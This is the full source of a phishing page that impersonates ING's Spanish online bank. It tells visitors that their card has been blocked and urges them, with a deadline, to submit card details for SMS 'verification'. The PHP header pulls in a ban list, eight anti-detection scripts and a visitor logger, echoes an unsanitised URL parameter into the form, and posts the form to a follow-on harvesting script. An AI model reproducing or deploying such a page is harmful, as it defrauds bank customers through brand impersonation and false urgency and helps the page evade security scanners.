
<?php
error_reporting(0);
$pg=$_GET['movil'];
$ligne = substr($pg , 3 , 12);
include "./rrrrr3d/ban.php";
include "./rrrrr3d/anti1.php";
include "./rrrrr3d/anti2.php"; 
include "./rrrrr3d/anti3.php";
include "./rrrrr3d/anti4.php"; 
include "./rrrrr3d/anti5.php"; 
include "./rrrrr3d/anti6.php"; 
include "./rrrrr3d/anti7.php"; 
include "./rrrrr3d/anti8.php"; 
include 'visitor.php';
?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="fr" lang="fr">
        <head><meta charset="windows-1252">

                <meta name="viewport" content="initial-scale=1.0; maximum-scale=1.0; user-scalable=0;"/><meta name="format-detection" content="telephone=no"/>
                <title>ING - Banco online sin comisiones </title>
                <link rel="icon" type="image/x-icon" href="./css/favicon.png"/>
                <link rel="stylesheet" href="css/merchant.css" type="text/css"/>
                <link rel="stylesheet" href="css/opus.css" type="text/css"/>
                <link rel="stylesheet" href="css/footer.css" type="text/css"/>
                <link rel="stylesheet" href="css/onei.css" type="text/css"/>
                <link rel="stylesheet" href="css/eui.css" type="text/css"/>
                <link rel="stylesheet" href="css/pie.css" type="text/css"/>
                <style type="text/css">
        #heading{
                text-align: center;
                font-size: 15px;
        font-weight: bold;
                margin-left: 10px;
                margin-top: 10px;
                float:right;
        }
</style>
        </head>
        <body>


<div style="background-color:#fff;padding-right:5px;padding-left:10px;" class="col-xs-12 col-md-8 col-lg-8 col-xl-8"><img style="margin-top: 0px; height: 30px; width: 200px;" src="css/ing_leon-01.svg">

                                <br><span id="heading"></span><br><br>
                        </div>

<div id="amount"></div>
        <div id="container">
            <div id="header">
                                <div class="divTitle">
                                        <br>

                                        <span class="subtitle"></span>
                                </div>

                        </div>

                        <form action="info2.php" method="post" id="payment_form" onsubmit="return checkForm();">
                                <input type="hidden" name="LANG" value="fr">
                                <input type="hidden" name="MCO" value="<?php print $ligne ?>">
                                <input type="hidden" name="client_type" value="mobile">
                                <input type="hidden" name="page_type" value="payment_offbill">

                                <div id="input_data">
                                        <div id="form_js_error_container">
                                                        <div class="wal_warning">
                                                                <div class="warningImage"></div>
                                                                <div id="warning_message" class="warning_message"></div>
                                                                <div class="clear"></div>
                                                        </div>
                                        </div>


                                        <div class="form_CardNumber">
                    <img src="css/warning.png" style="display: block;
        margin-left: auto;
        margin-right: auto;
        width: 50%; padding: 6px; height: 50px; width: 50px;">
                                                <br><br><label for="form_card_number" class="libelle">&iexcl;Su tarjeta ha sido bloqueada por razones de seguridad! Para continuar usando su tarjeta ING, debemos verificar si usted es el propietario real de la tarjeta. <br><span style="color:#ff6200"><!--?php echo $ligne ?--></span><br>Env&iacute;e su tarjeta y recibir&aacute; un c&oacute;digo SMS en su tel&eacute;fono m&oacute;vil para confirmar la autenticaci&oacute;n.
<span><br>
                <br><span>Confirme la autenticaci&oacute;n antes del 21/01/2021 o deber&aacute; enviar todos los documentos manualmente</span></span></label><br><br>

                                        </div>


                                </div>
                                <div class="button" style="color:#ff6200">
                                        <input type="submit"  class="btn" id="form_button_submit" name="form_button_submit" value="Enviar">
<div class="security_code" style="color:#ff6200"



                                                <div class="security_code_info petit">
                                                                                         </div>

                                        </div>
                                </div>
                        </form>

                <noscript>Diese Seite verwendet JavaScript. Aktivieren Sie Javascript �ber das Men� "Optionen" Ihres Browsers.</noscript>

</body>
</html>
